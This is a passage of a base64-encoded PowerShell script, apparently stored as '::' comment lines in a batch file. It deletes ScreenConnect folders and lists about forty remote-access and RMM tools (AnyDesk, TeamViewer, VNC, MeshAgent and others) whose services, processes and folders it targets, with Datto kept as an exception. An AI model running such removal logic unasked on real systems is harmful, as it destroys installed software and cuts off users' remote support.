::ICAgIyA0LiBmb3JlaWduIFNDIGluc3RhbGwgZGlycyAoUEYgKyBQRjg2KQ0KICAg
::IGZvcmVhY2ggKCRiYXNlIGluIEAoJGVudjpQcm9ncmFtRmlsZXMsICR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfSkpIHsNCiAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9y
::IC1ub3QgKFRlc3QtUGF0aCAkYmFzZSkpIHsgY29udGludWUgfQ0KICAgICAgICBH
::ZXQtQ2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3Jj
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBX
::aGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0KicgfSB8
::IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkZCA9ICRfLkZ1bGxO
::YW1lDQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBlciAkZCkgeyByZXR1cm4g
::fQ0KICAgICAgICAgICAgICAgICMgZGlyIGNhcnJpZXMgbm8gRlAvcmVsYXkgaW4g
::aXRzIG5hbWU7IHByb3RlY3QgdGhlIG9uZSBiYWNraW5nIGEga2VlcGVyL2dyeXhh
::IHNlcnZpY2UNCiAgICAgICAgICAgICAgICAkbGVhZiA9ICRfLk5hbWUNCiAgICAg
::ICAgICAgICAgICAkc3ZjSGVyZSA9IEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
::U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgV2hlcmUtT2JqZWN0IHsNCiAgICAg
::ICAgICAgICAgICAgICAgJGltID0gKEdldC1JdGVtUHJvcGVydHkgIkhLTE06XFNZ
::U1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1wkKCRfLk5hbWUpIiAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoDQogICAgICAgICAg
::ICAgICAgICAgICRpbSAtYW5kICgkaW0gLWxpa2UgIiokbGVhZioiKQ0KICAgICAg
::ICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoJHN2Y0hlcmUpIHsgTG9n
::ICJkaXJfc2tpcF9saXZlX3N2YyAkZCI7IHJldHVybiB9DQogICAgICAgICAgICAg
::ICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJf
::cmVtb3ZlZCAkZCIgfQ0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7
::IExvZyAiZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAg
::ICB9DQoNCiAgICAjIDUuIGRpc2FsbG93ZWQgUk1NIC8gcmVtb3RlLWFjY2VzcyB0
::b29scyAobWFya2V0IGNvdmVyYWdlIDIwMjYpLg0KICAgICMgS0VFUCBmb3JldmVy
::OiBEYXR0by9DZW50cmFTdGFnZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMgKGhh
::bmRsZWQgYWJvdmUpLg0KICAgICMgTkVWRVIgcHV0IERhdHRvL0NlbnRyYVN0YWdl
::L0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0Lg0KICAgIGZ1bmN0aW9uIElzLURhdHRv
::S2VlcGVyKFtzdHJpbmddJHMpIHsNCiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0
::dXJuICRmYWxzZSB9DQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICco
::P2kpRGF0dG98Q2VudHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50
::JykNCiAgICB9DQogICAgJHJtbSA9IEAoDQogICAgICAgIEB7IFRhZz0nQW55RGVz
::ayc7ICAgICAgU3ZjPUAoJ0FueURlc2snKTsgUHJvYz1AKCdBbnlEZXNrJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlEZXNrIik7
::IFByb2Q9QCgnQW55RGVzayonKSB9DQogICAgICAgIEB7IFRhZz0nVGVhbVZpZXdl
::cic7ICAgU3ZjPUAoJ1RlYW1WaWV3ZXIqJyk7IFByb2M9QCgnVGVhbVZpZXdlcion
::LCd0dl93MzIqJywndHZfeDY0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
::XFRlYW1WaWV3ZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGVhbVZpZXdl
::ciIpOyBQcm9kPUAoJ1RlYW1WaWV3ZXIqJykgfQ0KICAgICAgICBAeyBUYWc9J1Nw
::bGFzaHRvcCc7ICAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NV
::U2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JN
::YW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdT
::cGxhc2h0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgIFN2
::Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlpZ25pdGlvbicpOyBQ
::cm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9DQogICAg
::ICAgIEB7IFRhZz0nR29Ubyc7ICAgICAgICAgU3ZjPUAoJ0dvVG9NeVBDKicsJ0dv
::VG9Bc3Npc3QqJywnR29Ub1Jlc29sdmUqJyk7IFByb2M9QCgnR29Ub015UEMqJywn
::R29Ub0Fzc2lzdConLCdnMm0qJywnR29Ub1Jlc29sdmUqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcR29Ub015UEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cR29Ub015UEMiKTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0Kics
::J0dvVG8gUmVzb2x2ZSonLCdHb1RvTWVldGluZyonLCdHb1RvIENvbm5lY3QqJykg
::fQ0KICAgICAgICBAeyBUYWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0RGVz
::aycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQ0KICAgICAgICBA
::eyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAo
::J1N1cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3Vw
::cmVtbyonKSB9DQogICAgICAgIEB7IFRhZz0nRFdTZXJ2aWNlJzsgICAgU3ZjPUAo
::J0RXQWdlbnQnLCdkd2FnZW50KicpOyBQcm9jPUAoJ2R3YWdlbnQqJyk7IERpcnM9
::QCgiJGVudjpQcm9ncmFtRmlsZXNcRFdBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxEV0FnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxEV0FnZW50Iik7IFBy
::b2Q9QCgnRFdBZ2VudConLCdEV1NlcnZpY2UqJykgfQ0KICAgICAgICBAeyBUYWc9
::J1pvaG9Bc3Npc3QnOyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9NZWV0aW5n
::KicpOyBQcm9jPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgi
::JGVudjpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmciLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cWm9ob01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFzc2lzdConLCda
::b2hvTWVldGluZyonKSB9DQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICAg
::U3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRl
::KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMq
::JykgfQ0KICAgICAgICBAeyBUYWc9J0JvbWdhcic7ICAgICAgIFN2Yz1AKCdib21n
::YXIqJywnQmV5b25kVHJ1c3QqJyk7IFByb2M9QCgnYm9tZ2FyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEJvbWdhciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
::ODYpfVxCb21nYXIiLCIkZW52OlByb2dyYW1GaWxlc1xCZXlvbmRUcnVzdCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCZXlvbmRUcnVzdCIpOyBQcm9kPUAoJ0Jv
::bWdhcionLCdCZXlvbmRUcnVzdConKSB9DQogICAgICAgIEB7IFRhZz0nUGFyc2Vj
::JzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsgUHJvYz1AKCdwYXJzZWNkKicsJ3Bz
::ZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFBhcnNlYyIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1EYXRh
::XFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyonKSB9DQogICAgICAgIEB7IFRhZz0n
::Q2hyb21lUkQnOyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVt
::b3RpbmdfaG9zdConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVc
::Q2hyb21lIFJlbW90ZSBEZXNrdG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiKTsgUHJvZD1AKCdDaHJvbWUg
::UmVtb3RlIERlc2t0b3AqJykgfQ0KICAgICAgICBAeyBUYWc9J1VsdHJhVk5DJzsg
::ICAgIFN2Yz1AKCd1dm5jKicsJ3dpbnZuYyonKTsgUHJvYz1AKCd3aW52bmMqJywn
::dXZuYyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZOQyIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZOQyIpOyBQcm9kPUAoJ1VsdHJh
::Vk5DKicsJ1dpblZOQyonKSB9DQogICAgICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAg
::ICAgU3ZjPUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0dm5zZXJ2ZXIqJywndHZu
::dmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0Vk5DIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGln
::aHRWTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1A
::KCd2bmNzZXJ2ZXIqJyk7IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcion
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMiKTsgUHJvZD1AKCdWTkMgU2VydmVyKics
::J1JlYWxWTkMqJykgfQ0KICAgICAgICBAeyBUYWc9J0RhbWVXYXJlJzsgICAgIFN2
::Yz1AKCdEYW1lV2FyZSonKTsgUHJvYz1AKCdEV1JDUyonLCdEV1JDQyonLCdEYW1l
::V2FyZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTb2xhcldpbmRzIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNvbGFyV2luZHMiLCIkZW52OlByb2dy
::YW1GaWxlc1xEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIpOyBQcm9kPUAoJ0Rh
::bWVXYXJlKicpIH0NCiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0JzsgICBTdmM9
::QCgnTmV0U3VwcG9ydConKTsgUHJvYz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7
::IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0U3VwcG9ydCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgnTmV0U3VwcG9y
::dConKSB9DQogICAgICAgIEB7IFRhZz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1Np
::bXBsZUhlbHAqJyk7IFByb2M9QCgnU2ltcGxlU2VydmljZSonLCdzaW1wbGVzZXJ2
::aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNpbXBsZUhlbHAiLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQcm9kPUAoJ1Np
::bXBsZUhlbHAqJykgfQ0KICAgICAgICBAeyBUYWc9J0dldFNjcmVlbic7ICAgIFN2
::Yz1AKCdHZXRTY3JlZW4qJyk7IFByb2M9QCgnR2V0U2NyZWVuKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEdldFNjcmVlbiIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxHZXRTY3JlZW4iKTsgUHJvZD1AKCdHZXRTY3JlZW4qJykgfQ0KICAg
::ICAgICBAeyBUYWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJcGVyaXVzKicpOyBQ
::cm9jPUAoJ0lwZXJpdXNSZW1vdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSXBl
::cml1cyBSZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdJU0xPbmxpbmUnOyAgIFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJ
::U0xsaWdodConLCdJU0xBbHdheXNPbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElTTCBP
::bmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFsd2F5c09uKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdBbW15eSc7ICAgICAgICBTdmM9QCgnQW1teXkqJyk7
::IFByb2M9QCgnQW1teXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW1t
::eXkiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW1teXkiKTsgUHJvZD1AKCdB
::bW15eSonKSB9DQogICAgICAgIEB7IFRhZz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAo
::J1VsdHJhVmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmlld2VyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XFVsdHJhVmlld2VyIik7IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRt
::aW4qJyk7IFByb2M9QCgnQWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXEFlcm9BZG1pbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJv
::QWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRtaW4qJykgfQ0KICAgICAgICBAeyBUYWc9
::J0xpdGVNYW5hZ2VyJzsgIFN2Yz1AKCdMaXRlTWFuYWdlcionKTsgUHJvYz1AKCdS
::T01TZXJ2ZXIqJywnUk9NVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXExpdGVNYW5hZ2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExpdGVN
::YW5hZ2VyIik7IFByb2Q9QCgnTGl0ZU1hbmFnZXIqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1JhZG1pbic7ICAgICAgIFN2Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNl
::cnZlcjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJh
::ZG1pbiBTZXJ2ZXIgMyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSYWRtaW4g
::U2VydmVyIDMiKTsgUHJvZD1AKCdSYWRtaW4qJykgfQ0KICAgICAgICBAeyBUYWc9
::J05vTWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9
::QCgnbnhkKicsJ254c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6
::UHJvZ3JhbUZpbGVzXE5vTWFjaGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxOb01hY2hpbmUiKTsgUHJvZD1AKCdOb01hY2hpbmUqJykgfQ0KICAgICAgICBA
::eyBUYWc9J05pbmphT25lJzsgICAgIFN2Yz1AKCdOaW5qYVJNTUFnZW50Jywnbmlu
::amFybW0qJywnTmluamFSTU0qJyk7IFByb2M9QCgnTmluamFSTU1BZ2VudConLCdu
::aW5qYXJtbSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOaW5qYVJNTUFn
::ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphUk1NQWdlbnQiLCIk
::ZW52OlByb2dyYW1EYXRhXE5pbmphUk1NQWdlbnQiLCIkZW52OlByb2dyYW1GaWxl
::c1xOaW5qYU9uZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYU9uZSIp
::OyBQcm9kPUAoJ05pbmphUk1NKicsJ05pbmphT25lKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdBdGVyYSc7ICAgICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAo
::J0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQVRFUkEg
::TmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQVRFUkEgTmV0d29y
::a3MiLCIkZW52OlByb2dyYW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgn
::QXRlcmEqJykgfQ0KICAgICAgICBAeyBUYWc9J0Nvbm5lY3RXaXNlJzsgIFN2Yz1A
::KCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJh
::eSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRlbnY6UHJvZ3JhbUZp
::bGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExh
::YlRlY2ggQ2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywn
::Q29ubmVjdFdpc2UgUk1NKicsJ0xhYlRlY2gqJykgfQ0KICAgICAgICBAeyBUYWc9
::J0thc2V5YSc7ICAgICAgIFN2Yz1AKCdBZ2VudE1vbicsJ0thc2V5YSonLCdLQUFE
::UyonKTsgUHJvYz1AKCdBZ2VudE1vbionLCdLYXNleWEqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcS2FzZXlhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::XEthc2V5YSIpOyBQcm9kPUAoJ0thc2V5YSBWU0EqJywnS2FzZXlhIEFnZW50Kicp
::IH0NCiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAgICBTdmM9QCgnQWR2YW5j
::ZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRyYWwqJyk7IFBy
::b2M9QCgnRmlsZVN5c3RlbUFnZW50KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCIs
::IiRlbnY6UHJvZ3JhbUZpbGVzXE4tYWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hub2xvZ2llcyIsIiRlbnY6UHJv
::Z3JhbUZpbGVzXE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::TVNQQSBGaWxlcyIpOyBQcm9kPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQq
::JywnTi1hYmxlKicsJ04tY2VudHJhbConLCdOLXNpZ2h0KicsJ1Rha2UgQ29udHJv
::bConLCdTb2xhcldpbmRzIE1TUConKSB9DQogICAgICAgIEB7IFRhZz0nU3luY3Jv
::JzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFByb2M9QCgnU3lu
::Y3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBh
::aXJUZWNoIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIk
::ZW52OlByb2dyYW1GaWxlc1xTeW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cU3luY3JvIiwiJGVudjpQcm9ncmFtRGF0YVxTeW5jcm8iKTsgUHJvZD1AKCdT
::eW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1B1bHNld2F5JzsgICAgIFN2Yz1AKCdQdWxzZXdheSonLCdQQyBNb25pdG9y
::KicpOyBQcm9jPUAoJ1BDTW9uaXRvck1ncionLCdQQ01vbml0b3JNYW5hZ2VyKics
::J1B1bHNld2F5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFB1bHNld2F5
::IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFB1bHNld2F5IiwiJGVudjpQcm9n
::cmFtRmlsZXNcUEMgTW9uaXRvciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQ
::QyBNb25pdG9yIik7IFByb2Q9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKSB9
::DQogICAgICAgIEB7IFRhZz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1cGVyT3Bz
::KicpOyBQcm9jPUAoJ1N1cGVyT3BzKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cGVyT3Bz
::IiwiJGVudjpQcm9ncmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1cGVyT3Bz
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdMZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2
::ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwiLCIkZW52
::OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J0FjdGlvbjEnOyAgICAgIFN2Yz1AKCdBY3Rpb24xKicpOyBQcm9j
::PUAoJ0FjdGlvbjEqJywnYWN0aW9uMV9hZ2VudConKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xBY3Rpb24xIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFj
::dGlvbjEiLCIkZW52OlByb2dyYW1EYXRhXEFjdGlvbjEiKTsgUHJvZD1AKCdBY3Rp
::b24xKicpIH0NCiAgICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUnOyBTdmM9QCgn
::TWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5h
::Z2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxNYW5hZ2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyon
::LCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9pbnQgQ2VudHJhbConLCdSTU0gQ2Vu
::dHJhbConKSB9DQogICAgICAgIEB7IFRhZz0nVGFjdGljYWxSTU0nOyAgU3ZjPUAo
::J3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnKTsgUHJvYz1A
::KCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJz
::PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX1cVGFjdGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVz
::XE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2Vu
::dCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01lc2ggQWdlbnQqJywnTWVzaENlbnRy
::YWwqJykgfQ0KICAgICAgICBAeyBUYWc9J01lc2hDZW50cmFsJzsgIFN2Yz1AKCdN
::ZXNoIEFnZW50JywnTWVzaEFnZW50JywnTWVzaENlbnRyYWwqJyk7IFByb2M9QCgn
::TWVzaEFnZW50KicsJ01lc2hDZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVz
::aCBBZ2VudCIpOyBQcm9kPUAoJ01lc2gqQWdlbnQqJywnTWVzaENlbnRyYWwqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAgIFN2Yz1AKCdTQUFaKics
::J0NvbnRpbnV1bSonKTsgUHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xTQUFaT0QiLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmlsZXNcQ29udGludXVtIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9kPUAoJ0Nv
::bnRpbnV1bSonLCdTQUFaKicpIH0NCiAgICAgICAgQHsgVGFnPSdOYXZlcmlzayc7
::ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7IFByb2M9QCgnTmF2ZXJpc2sqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2siLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayonKSB9DQog
::ICAgICAgIEB7IFRhZz0nSW1teUJvdCc7ICAgICAgU3ZjPUAoJ0ltbXlCb3QqJywn
::SW1teSonKTsgUHJvYz1AKCdJbW15QWdlbnQqJywnSW1teUJvdConKTsgRGlycz1A
